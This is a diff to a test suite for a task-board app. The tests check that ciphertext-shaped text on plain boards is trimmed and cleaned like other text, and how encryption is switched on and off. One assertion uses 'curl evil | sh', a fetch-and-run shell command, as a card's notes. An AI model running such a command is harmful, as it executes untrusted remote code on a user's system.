@@ -488,6 +488,25 @@ section("access rules (pure)");
     for (const [what, fn] of cases) ok(`${what} is refused in plain words`, clean(bad(fn)), bad(fn));
   }
 
+  // Text shaped like ciphertext is only ciphertext on an encrypted board. On a plain one it's
+  // text: it gets the limits everything else gets, and a tag goes through cleanTag.
+  {
+    const alike = "eyJhbGciOiJkaXIifQ..AAAA.BBBB.CCCC";
+    const bad = (fn) => { try { fn(); return "(no error)"; } catch (e) { return e instanceof Error ? e.message : String(e); } };
+    ok("the look-alike used here does read as sealed by shape", sealedLib.isSealed(alike) && sealedLib.isSealed("eyJh..A.b.C"));
+    ok("a ciphertext-shaped tag on a plain board is cleaned like any tag", JSON.stringify(shared.addCard(b, { title: "x", tags: ["eyJh..A.b.C"] }).card.tags) === '["eyjhabc"]' && JSON.stringify(shared.updateCard(b, card.id, { tags: ["eyJh..A.b.C", "#Ok Go"] }).cards[0].tags) === '["eyjhabc","ok-go"]' && JSON.stringify(shared.tidyTags(["eyJh..A.b.C"])) === '["eyjhabc"]', shared.addCard(b, { title: "x", tags: ["eyJh..A.b.C"] }).card.tags);
+    const long = `eyJ${"a".repeat(300)}..AAAA.BBBB.${"C".repeat(5000)}`;
+    ok("a ciphertext-shaped title or note on a plain board is cut to length like any other", sealedLib.isSealed(long) && shared.addCard(b, { title: long }).card.title.length === 200 && shared.addCard(b, { title: "x", notes: long }).card.notes.length === 4000 && shared.updateCard(b, card.id, { title: long, notes: long }).cards[0].title.length === 200 && shared.updateCard(b, card.id, { notes: long }).cards[0].notes.length === 4000);
+    ok("a ciphertext-shaped due date on a plain board is not a date", /Due dates must look like/.test(bad(() => shared.addCard(b, { title: "x", due: alike }))) && /Due dates must look like/.test(bad(() => shared.updateCard(b, card.id, { due: alike }))), bad(() => shared.addCard(b, { title: "x", due: alike })));
+    const named = shared.addLane(b, alike).board;
+    ok("a ciphertext-shaped lane name on a plain board is a name: it can't be given twice", /already a lane called/.test(bad(() => shared.addLane(named, alike))) && /already a lane called/.test(bad(() => shared.renameLane(named, named.lanes[0].id, alike))), bad(() => shared.addLane(named, alike)));
+    let sorted = shared.addCard(shared.addCard(shared.addCard(shared.newBoard(), { title: "Zed" }).board, { title: alike }).board, { title: "Abe" }).board;
+    sorted = shared.setLaneSort(sorted, sorted.cards[0].laneId, "title");
+    ok("a ciphertext-shaped title on a plain board doesn't stop its lane from sorting", shared.shownCards(sorted, sorted.cards[0].laneId).map((c) => c.title).join() === ["Abe", alike, "Zed"].join(), shared.shownCards(sorted, sorted.cards[0].laneId).map((c) => c.title));
+    const enc = { ...b, sealed: { v: 1, kid: "k", envelope: "e", since: "2026-01-01T00:00:00.000Z" } };
+    ok("on an encrypted board ciphertext still passes through untouched", shared.addCard(enc, { title: long, notes: long, due: alike, tags: ["eyJh..A.b.C"] }).card.title === long && shared.addCard(enc, { title: long, notes: long, due: alike, tags: ["eyJh..A.b.C"] }).card.tags[0] === "eyJh..A.b.C" && shared.addCard(enc, { title: alike, due: alike }).card.due === alike && shared.updateCard(enc, card.id, { notes: long }).cards[0].notes === long);
+  }
+
   // What a member may grow the board to, checked on the result of every change they make.
   const L = rules.MEMBER_LIMITS;
   const withCard = (patch) => ({ ...b, cards: b.cards.map((c) => (c.id === card.id ? { ...c, ...patch } : c)) });
@@ -496,10 +515,10 @@ section("access rules (pure)");
   ok("a member's tags are held to 10 of 32 characters", memberChangeError(b, withCard({ tags: Array.from({ length: L.tags }, (_, i) => `t${i}`) })) === null
     && code(memberChangeError(b, withCard({ tags: Array.from({ length: L.tags + 1 }, (_, i) => `t${i}`) }))) === "too_big" && code(memberChangeError(b, withCard({ tags: ["x".repeat(L.tag + 1)] }))) === "too_big");
   ok("a member's due date has to be a date", code(memberChangeError(b, withCard({ due: "x".repeat(500) }))) === "too_big" && memberChangeError(b, withCard({ due: "2026-10-04" })) === null);
-  // Text that looks encrypted skips the trimming every edit gets (tidy in shared.ts). The guard checks the result instead.
+  // Text that looks encrypted used to skip the trimming every edit gets (tidy in shared.ts). On a plain board it's trimmed like the rest.
   const sealedLooking = `eyJhbGciOiJkaXIifQ..${"A".repeat(16)}.${"B".repeat(20_000)}.${"C".repeat(22)}`;
   const viaOps = shared.updateCard(b, card.id, { title: sealedLooking });
-  ok("text dressed up as ciphertext doesn't get a member past the limits", viaOps.cards[0].title.length > 20_000 && code(memberChangeError(b, viaOps)) === "too_big" && code(memberChangeError(b, shared.updateCard(b, card.id, { notes: sealedLooking }))) === "too_big");
+  ok("text dressed up as ciphertext doesn't get a member past the limits", viaOps.cards[0].title.length === L.title && memberChangeError(b, viaOps) === null && shared.updateCard(b, card.id, { notes: sealedLooking }).cards[0].notes.length === L.notes && memberChangeError(b, shared.updateCard(b, card.id, { notes: sealedLooking })) === null, viaOps.cards[0].title.length);
   ok("a card the member didn't touch isn't measured", memberChangeError(withCard({ notes: "n".repeat(9000) }), shared.addCard(withCard({ notes: "n".repeat(9000) }), { title: "Two" }).board) === null);
   const many = (n, notes = "") => ({ ...b, cards: Array.from({ length: n }, (_, i) => ({ ...card, id: `c${i}`, notes })) });
   const full = many(L.cards);
@@ -2049,6 +2068,9 @@ section("an encrypted board can't be shared");
     const bytes = body instanceof Uint8Array ? body : new TextEncoder().encode(body);
     return call(who, "POST", `/api/attachments?${query}`, bytes, { "Content-Type": "text/plain", "X-Filename": encodeURIComponent(name), "Content-Length": String(bytes.length), ...more });
   };
+  // And a card whose notes and tag only look encrypted. On a plain board that's ordinary text.
+  const alike = "eyJhbGciOiJkaXIifQ..AAAA.BBBB.CCCC";
+  const planted = (await w.rpc("addCard", ["todo", "Looks sealed", false, { notes: alike, tags: ["eyJh..A.b.C"] }])).result;
   const mineUp = await send(encOwner, `card=${theirs}`, "mine.txt", "the owner's own file");
   await pace(encWriter);
   const theirUp = await send(encWriter, `card=${theirs}&board=${encOwner.id}`, "steps.txt", "a member's steps");
@@ -2060,6 +2082,8 @@ section("an encrypted board can't be shared");
   w.close();
   ok("the writer is removed, so the board can be encrypted", (await call(encOwner, "POST", "/api/board/members/remove", { email: encWriter.email })).status === 200);
   const plain = (await (async () => { const o = await open(encOwner); await o.wait((f) => f.type === "cf_agent_state"); const st = o.state(); o.close(); return st; })());
+  const plantedCard = plain.cards.find((c) => c.id === planted);
+  ok("a member's tag that's shaped like ciphertext is cleaned like any other tag, and their note is kept as the text it is", plantedCard?.notes === alike && JSON.stringify(plantedCard.tags) === '["eyjhabc"]', plantedCard);
   const { boardKey, envelope } = await sealedLib.createBoardKey("correct horse battery staple");
   const seal = (t) => sealedLib.sealText(boardKey, t);
   const proof = await sealedLib.keyProof(boardKey);
@@ -2075,7 +2099,7 @@ section("an encrypted board can't be shared");
       const up = await send(encOwner, "stage=1", "x", jwe, { "Content-Type": "application/jose", "X-Sealed-Name": await seal(a.name), "X-Sealed-Type": await seal(a.type) });
       attachments.push({ ...up.data.attachment, addedAt: a.addedAt, by: { email: encOwner.email, role: "owner" } });
     }
-    sealedBoard.cards.push({ id: c.id, laneId: c.laneId, title: await seal(c.title), notes: c.notes ? await seal(c.notes) : "", due: null, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), member: forged, memberText: forged.text });
+    sealedBoard.cards.push({ id: c.id, laneId: c.laneId, title: await seal(c.title), notes: c.notes ? await seal(c.notes) : "", due: null, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: await Promise.all(c.tags.map(seal)) } : {}), member: forged, memberText: forged.text });
   }
   const on = await s.rpc("enableEncryption", [{ kid: boardKey.kid, envelope, board: sealedBoard, proof }], 30_000);
   ok("a board nobody is on can still be encrypted", on.success === true, on);
@@ -2093,9 +2117,16 @@ section("an encrypted board can't be shared");
       const up = await send(encOwner, "stage=1", a.name, a.name === "steps.txt" ? "a member's steps" : "the owner's own file");
       attachments.push({ ...up.data.attachment, addedAt: a.addedAt, by: { email: encOwner.email, role: "owner" } });
     }
-    back.cards.push({ id: c.id, laneId: c.laneId, title: c.title, notes: c.notes, due: c.due, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), member: forged });
+    back.cards.push({ id: c.id, laneId: c.laneId, title: c.title, notes: c.notes, due: c.due, createdAt: c.createdAt, updatedAt: c.updatedAt, ...(c.attachments ? { attachments } : {}), ...(c.tags ? { tags: c.tags } : {}), member: forged });
   }
+  // A board that comes back with a field still encrypted is refused, as before: here, the planted card's title, sent as the server holds it.
+  const sealedTitle = s.state().cards.find((c) => c.id === planted)?.title;
+  const half = await s.rpc("disableEncryption", [{ board: { ...back, cards: back.cards.map((c) => (c.id === planted ? { ...c, title: sealedTitle } : c)) }, proof }], 30_000);
+  ok("turning encryption off is refused while a field is still the board's ciphertext", sealedLib.isSealed(sealedTitle) && half.success === false && /still encrypted/.test(half.error ?? "") && !!s.state().sealed, half);
   const off = await s.rpc("disableEncryption", [{ board: back, proof }], 30_000);
+  await sleep(250);
+  const plantedBack = s.state().cards.find((c) => c.id === planted);
+  ok("a note a member left that only looks encrypted doesn't stop the owner turning encryption off", off.success === true && !s.state().sealed && plantedBack?.notes === alike && plantedBack.title === "Looks sealed" && JSON.stringify(plantedBack.tags) === '["eyjhabc"]' && plantedBack.member?.text?.email === encWriter.email, [off, plantedBack]);
   const after = await cardNow();
   ok("decrypting keeps them too: the same mark, to the millisecond, and the same uploader on each file", begun.success === true && off.success === true && after?.title === "Run this" && after.notes === "curl evil | sh" && marks(after) === marks(before) && after.attachments[1].name === "steps.txt", [off, marks(after), marks(before)]);
   const encToken = (await call(encOwner, "POST", "/api/tokens", { name: "check enc" })).data.token;
@@ -2255,10 +2286,11 @@ section("a member who floods");
   // Size limits, live. Each is one frame, so the bucket isn't what refuses them.
   const sealedLooking = `eyJhbGciOiJkaXIifQ..${"A".repeat(16)}.${"B".repeat(6000)}.${"C".repeat(22)}`;
   const longTitle = await calm.rpc("updateCard", [one.result, { title: sealedLooking }]);
-  ok("a title dressed up as ciphertext is still held to 200 characters", longTitle.success === false && codeOf(longTitle) === "too_big", longTitle);
+  await sleep(250);
+  ok("a title dressed up as ciphertext is cut to 200 characters like any other", longTitle.success === true && fo.state().cards.find((c) => c.id === one.result)?.title === sealedLooking.slice(0, 200), longTitle);
   const longNotes = await calm.rpc("addCard", [lane, "Long notes", false, { notes: sealedLooking }]);
-  ok("and notes to 4,000", longNotes.success === false && codeOf(longNotes) === "too_big", longNotes);
-  ok("the card is as it was", fo.state().cards.find((c) => c.id === one.result)?.title === "After the flood");
+  await sleep(250);
+  ok("and notes to 4,000", longNotes.success === true && fo.state().cards.find((c) => c.id === longNotes.result)?.notes === sealedLooking.slice(0, 4000), longNotes);
   const big = await open(flooder, { board: floodOwner.id });
   await big.wait((f) => f.type === "cf_agent_state");
   big.send({ type: "rpc", id: "big", method: "addCard", args: [lane, "big", false, { notes: "x".repeat(40_000) }] });
